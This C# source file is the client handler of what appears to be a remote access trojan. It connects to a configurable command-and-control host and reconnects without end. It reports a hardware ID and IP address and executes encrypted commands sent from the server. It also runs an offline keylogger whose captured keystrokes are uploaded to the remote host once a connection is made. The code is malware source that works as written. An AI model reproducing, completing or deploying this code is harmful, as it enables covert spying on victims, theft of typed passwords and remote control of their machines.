using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System;
using System.Net.Sockets;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Client
{
    internal class ClientHandler
    {
#if DEBUG

#else
        internal static string hostIp = "127.0.0.1";    //%DNS%
        internal static int port = 7788;                //999999     
#endif
        internal Host host { get; set; }
        internal string HWID { get; set; }
        internal string baseIp { get; set; }
        private Socket socket { get; set; }
        internal bool Connected { get; set; }


        private delegate byte[] ReadDataAsync();
        private delegate IPacket ReadPacketAsync(byte[] BufferPacket);
        private delegate bool ConnectAsync();
        private delegate int SendDataAsync(IPacket data);


        private ReadDataAsync readDataAsync;
        private ReadPacketAsync readPacketAsync;
        private ConnectAsync connectAsync;
        private readonly SendDataAsync sendDataAsync;


        internal ClientHandler() : base()
        {
            host = new Host(Config.hostIp, Config.port);
            readDataAsync = new ReadDataAsync(ReceiveData);
            readPacketAsync = new ReadPacketAsync(PacketParser);
            sendDataAsync = new SendDataAsync(SendData);
        }


        public void ConnectStart()
        {
            Thread.Sleep(125);
            if (!EntryClass.KeylogOn && Config.offKeylog != "False") 
            {
                EntryClass.StartOfflineKeylogger();
            }
            connectAsync = new ConnectAsync(Connect);
            connectAsync.BeginInvoke(new AsyncCallback(EndConnect), null);
        }

        private bool Connect() 
        {
            try
            {
                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                socket.Connect(host.host, host.port);
                return true;
            }
            catch{ }
            return false;
        }

        private void StopOfflineKeyLogger()
        {
            Plugin.Launch.StopHook();
            Plugin.Launch.ClientSender(EntryClass.clientHandler.host, Config.generalKey, new KeylogOfflinePacket(Plugin.Launch.CurrentKeyStroke(), EntryClass.clientHandler.baseIp, EntryClass.clientHandler.HWID));
            Plugin.Launch.ClearKeyStroke();
            EntryClass.KeylogOn = false; 
        }

        public void EndConnect(IAsyncResult ar) 
        {
            Connected = connectAsync.EndInvoke(ar);
            if (Connected)
            {
                ConnectedPacket connectionPacket = new ConnectedPacket();
                connectionPacket.baseIp = this.socket.LocalEndPoint.ToString();
                this.HWID = connectionPacket.HWID;
                this.baseIp = socket.LocalEndPoint.ToString();
                SendPacket(connectionPacket);
                if (EntryClass.KeylogOn)
                    StopOfflineKeyLogger();
                Receive();
            }
            else
            {
                ConnectStart();
            }
        }
     
        public void Receive() 
        {
            if(Connected)
                readDataAsync.BeginInvoke(new AsyncCallback(EndDataRead), null);
            else
                ConnectStart();     
        }
        private byte[] ReceiveData()
        {
            try
            {
                int total = 0;
                int recv;
                byte[] header = new byte[5];
                socket.Poll(-1, SelectMode.SelectRead);
                recv = socket.Receive(header, 0, 5, 0);

                int size = BitConverter.ToInt32(new byte[4] { header[0], header[1], header[2], header[3] }, 0);
                PacketType packetType = (PacketType)header[4];

                int dataleft = size;
                byte[] data = new byte[size];
                while (total < size)
                {
                    recv = socket.Receive(data, total, dataleft, 0);
                    total += recv;
                    dataleft -= recv;
                }

                return data;
            }
            catch (Exception)
            {
                Connected = false;
                return null;
            } 
        }
        public void EndDataRead(IAsyncResult ar) 
        {
            byte[] data = readDataAsync.EndInvoke(ar);

            if (data != null && Connected)
                readPacketAsync.BeginInvoke(data, new AsyncCallback(EndPacketRead), null);
            
            Receive();
            
            //Task.Run(() => PacketParser(data));
        }


        private IPacket PacketParser(byte[] BufferPacket)
        {
            return BufferPacket.DeserializePacket(Config.generalKey);
        }
        public void EndPacketRead(IAsyncResult ar) 
        {
            IPacket packet = readPacketAsync.EndInvoke(ar);
            PacketHandler.ParsePacket(packet);
        }


        public void SendPacket(IPacket packet)
        {
            if(Connected)
                sendDataAsync.BeginInvoke(packet, new AsyncCallback(SendDataCompleted), null);
        }
        private int SendData(IPacket data)
        {
            try
            {
                byte[] encryptedData = data.SerializePacket(Config.generalKey);
                lock (socket)
                {
                    int total = 0;
                    int size = encryptedData.Length;
                    int datalft = size;
                    byte[] header = new byte[5];
                    socket.Poll(-1, SelectMode.SelectWrite);

                    byte[] temp = BitConverter.GetBytes(size);

                    header[0] = temp[0];
                    header[1] = temp[1];
                    header[2] = temp[2];
                    header[3] = temp[3];
                    header[4] = (byte)data.packetType;

                    int sent = socket.Send(header);

                    while (total < size)
                    {
                        sent = socket.Send(encryptedData, total, size, SocketFlags.None);
                        total += sent;
                        datalft -= sent;
                    }
                    return total;
                }
            }
            catch (Exception)
            {
                Connected = false;
                return 0;
            }
        }
        private void SendDataCompleted(IAsyncResult ar)
        {
            int length = sendDataAsync.EndInvoke(ar);
            if (Connected)
            {
              /*  if (length != 0)//TODO : LOGS
                    MessageBox.Show("Data sent ! + length = " + length.ToString());
                else
                    MessageBox.Show("Error while sending data + length =" + length.ToString());*/
            }
        }
    }
}
